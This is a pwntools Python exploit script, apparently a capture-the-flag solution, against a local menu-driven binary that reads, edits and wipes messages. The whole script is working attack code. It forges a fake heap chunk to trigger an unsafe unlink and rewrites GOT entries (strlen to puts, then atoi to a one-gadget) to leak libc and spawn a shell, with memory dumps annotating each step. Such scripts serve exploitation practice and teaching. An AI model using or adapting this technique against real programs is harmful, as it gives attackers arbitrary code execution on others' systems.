from pwn import *

context.log_level='debug'

def read_msg(index,msg):
	s.recvuntil(':')
	s.sendline('1')
	s.recvuntil(':')
	s.sendline(str(index))
	s.recvuntil('msg:')
	s.sendline(msg)

def edit_msg(index,new_msg):
        s.recvuntil(':')
        s.sendline('2')
        s.recvuntil(':')
        s.sendline(str(index))
        s.recvuntil('new msg:')
        s.sendline(new_msg)

def wipe_msg(index):
        s.recvuntil(':')
        s.sendline('3')
        s.recvuntil(':')
        s.sendline(str(index))

if __name__ == "__main__":

	s=process('d')
	e=ELF('./d')

	read_msg(0,'a'*0x36) #(3*(0x36>>2)+1)=0x28
	for i in range(1,11):
		read_msg(i,'A'*0x36)

	read_msg(11,'z'*0x36) #(3*(0x34>>2)+1)=0x28
	read_msg(12,'A'*0x148) #hex(3*(308>>2)+1)=0xe8
	read_msg(13,'A'*0x174) #(3*(0x174>>2)+1)=0x118
	read_msg(14,'A'*0x174) #(3*(0x174>>2)+1)=0x118
	
	payload=p64(0x0)+p64(0x20)
	payload+=p64(0x6021d8-0x18)+p64(0x6021d8-0x10)
	payload+=p64(0x20)

	
	edit_msg(11,payload)
	#After
	'''
	0x6021c8:       0x00000000023ec1c0      0x00000000023ec1f0
	0x6021d8:       0x00000000023ec220      0x00000000023ec250
	0x6021e8:       0x00000000023ec350      0x00000000023ec470
	'''

	wipe_msg(12) #unsafe_unlink
	#After
	'''
	0x6021c8:       0x00000000023ec1c0      0x00000000023ec1f0 <=index 8
	0x6021d8:       0x00000000006021c0      0x0000000000000000
	0x6021e8:       0x00000000023ec350      0x00000000023ec470
	'''

	read_msg(20,'1')

	edit_msg(11,p64(e.got['strlen']))
	edit_msg(8,p64(e.plt['puts'])) #strlen@got overwrite!!	


	edit_msg(20,'\n')

	main_arena88=u64(s.recv(6).ljust(8,'\x00'))
	libc_base=main_arena88-0x3c4c88

	oneshot=libc_base+0xf02a4

	edit_msg(11,p64(e.got['atoi']))
	edit_msg(8,p64(oneshot)) #atoi@got overwrite!!

	s.interactive()
